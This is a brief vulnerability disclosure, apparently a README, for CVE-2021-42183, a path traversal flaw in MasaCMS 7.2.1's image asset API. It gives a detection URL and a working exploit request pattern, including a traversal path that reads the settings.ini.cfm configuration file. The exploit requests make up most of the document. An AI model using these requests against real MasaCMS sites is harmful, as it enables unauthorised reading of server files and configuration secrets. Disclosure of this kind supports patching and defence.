# CVE-2021-42183

MasaCMS 7.2.1 is affected by a path traversal vulnerability in /index.cfm/_api/asset/image/.

# Detection

```
If this file is readable it means the vulnerablilty exists.
https://example.com/index.cfm/_api/asset/image/?filePath=/Application.cfc
```


# Exploit

```
https://example.com/index.cfm/_api/asset/image/?filePath=/../<Path>
- Read The Config File
https://example.com/index.cfm/_api/asset/image/?filePath=/../config/settings.ini.cfm 
```

## Tested On 
MasaCMS 7.2.1

## Vendor

http://www.masacms.com

https://github.com/MasaCMS/MasaCMS


## Discoverd By:

Rawi And BassamAssiri.
